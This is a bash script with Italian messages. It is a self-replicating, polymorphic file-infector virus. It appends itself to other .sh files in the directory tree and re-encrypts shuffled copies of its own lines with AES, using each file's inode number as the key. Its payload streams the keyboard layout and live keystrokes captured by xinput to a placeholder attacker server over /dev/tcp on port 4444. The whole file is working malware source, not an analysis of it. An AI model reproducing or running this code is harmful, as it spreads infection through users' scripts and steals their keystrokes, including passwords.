ret_val="-1" #@1
CRYPTED=0 #@2
echo -e '\''n''\''n'"------INIZIO: $0 ------------"'\''n' #@3
if [ "$1" == "test" ]; then  #@4
  echo "TEST OVER-INFECTION" #@5
  ret_val="0"  #@6
else  #@7
RANDOM=$$  #@8
find $(pwd) -regex ".*\.\(sh\)" -printf '%p ' | while read -d $' ' target; do  #@9
  echo "ANALISI TARGET: $target" #@10
  nbline=$(wc -l $target)  #@11
  nbline=$(echo $nbline | cut -d " " -f1)  #@12
  if [ $(($nbline)) -lt 73 ]; then  #@13
    echo "FILE CORTO --> SALTO $target" #@14
    continue  #@15
  fi  #@16
  tail -n 1 $target | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) > /dev/null 2> /dev/null #@17
  if [ "$?" -eq "0" ]; then  #@18
    echo "ULTIMA RIGA CONTIENE UNA CODIFICA" #@19
    cod_ordinato=$(tail -n 1 $target | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- ) #@20
    echo "ESEGUO EVAL ULTIMA RIGA DI $target DECODIFICATA E RIORDINATA CON PARAMETRO TEST" #@21
    cod_ordinato=${cod_ordinato/CRYPTED=[0-1]/"CRYPTED=$CRYPTED"} #@22
    eval "${cod_ordinato//'$1'/'test'}"  #@23
    echo "EVAL ESEGUITO" #@24
    if [ "$ret_val" == "0" ]; then  #@25
      echo -e "!FILE $target GIA' INFETTATO, SALTO!" #@26
      continue  #@27
    fi  #@28
  fi  #@29
  echo "FILE $target DA INFETTARE" #@30
  echo "" >> $target #@31
  echo "backup=\$(tail -n 1 \$0 | openssl enc -d -aes-128-cbc -A -a -salt -k \$(ls -i \$0 | cut -d\" \" -f1) | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- )" >> $target  #@32
  echo "eval \"\${backup/CRYPTED=0/'CRYPTED=1'}\" &" >> $target  #@33
  echo "exit 0" >> $target  #@34
  tabft=("FT" [70]=" ")  #@35
  declare -i nbl=0  #@36
  var_righe="" #@37
  if [ $CRYPTED == 0 ]; then #@38
   echo "FILE $0 NON CRIPTATO, PRENDO RIGHE DAL FILE" #@39
   while [ $nbl -ne 70 ]; do  #@40
     valindex=$(((RANDOM % 70)+1))  #@41
     while [ "${tabft[$valindex]}" == "FT" ]; do  #@42
       valindex=$(((RANDOM % 70) + 1))  #@43
     done  #@44
     line=$(tail -n $valindex $0 | head -1)  #@45
     var_righe+='\''n'$line #@46
     nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@47
   done  #@48
  else #@49
   echo -e "FILE $0 CRIPTATO, DECODIFICO ULTIMA RIGA E METTO TUTTO IN UNA VARIABILE"'\''n'"PERMUTO E CRIPTO" #@50
   cod_ordinato=$(tail -n 1 $0 | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $0 | cut -d" " -f1) | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- ) #@51
   while [ $nbl -ne 70 ]; do  #@52
     valindex=$(((RANDOM % 70)+1))  #@53
     while [ "${tabft[$valindex]}" == "FT" ]; do  #@54
       valindex=$(((RANDOM % 70) + 1))  #@55
     done  #@56
     line=$(echo "$cod_ordinato" | tail -n $valindex | head -1)  #@57
     var_righe+='\''n'$line #@58
     nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@59
   done  #@60
  fi #@61
  echo "APPENDO RIGHE PERMUTATE E CRIPTATE A $target" #@62
  echo -e "$var_righe" | openssl enc -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) >> $target #@63
  echo -e "$target criptato con: " && echo -e $(ls -i $target | cut -d" " -f1) #@64
done  #@65
echo -e '\''n''\''n'"ESECUZIONE PAYLOAD DA $0"'\''n''\''n' #@66
xmodmap -pke > /dev/tcp/IP_SERVER_ATTACCANTE/4444 #@67
xinput --test $(xinput --list | grep "AT Translated Set 2 keyboard" | cut -d"=" -f2 | cut -d$'\t' -f1 ) > /dev/tcp/IP_SERVER_ATTACCANTE/4444 & #@68
fi #@69
echo -e '\''n''\''n'"FINE $0"'\''n''\''n' #@70
